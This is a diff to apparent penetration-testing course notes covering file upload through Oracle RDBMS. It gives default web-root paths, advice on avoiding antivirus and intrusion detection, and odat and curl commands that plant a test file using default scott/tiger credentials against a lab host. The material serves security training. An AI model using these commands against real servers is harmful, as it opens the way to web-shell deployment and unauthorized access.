@@ -173,7 +173,7 @@ LOGSTDBY_ADMINISTRATOR
 ...SNIP...
 ```
 
-
+#### Oracle RDBMS - File Upload
 Another option is to upload a web shell to the target. 
 However, this requires the server to run a web server, and we need to know the exact location of the root directory for the webserver. 
 If we know what type of system we are dealing with, we can try the default paths
@@ -183,4 +183,16 @@ If we know what type of system we are dealing with, we can try the default paths
 | Linux   | `/var/www/html`      |
 | Windows | `C:\inetpub\wwwroot` |
 
-First, trying our exploitation approach with files that do not look dangerous for Antivirus or Intrusion detection/prevention systems is always important. Therefore, we create a text file with a string and use it to upload to the target system.
+First, trying our exploitation approach with files that do not look dangerous for Antivirus or Intrusion detection/prevention systems is always important. 
+Therefore, we create a text file with a string and use it to upload to the target system.
+
+```shell-session
+echo "Oracle File Upload Test" > testing.txt
+```
+```shell-session
+odat utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt
+```
+
+```shell-session
+ curl -X GET http://10.129.204.235/testing.txt
+```
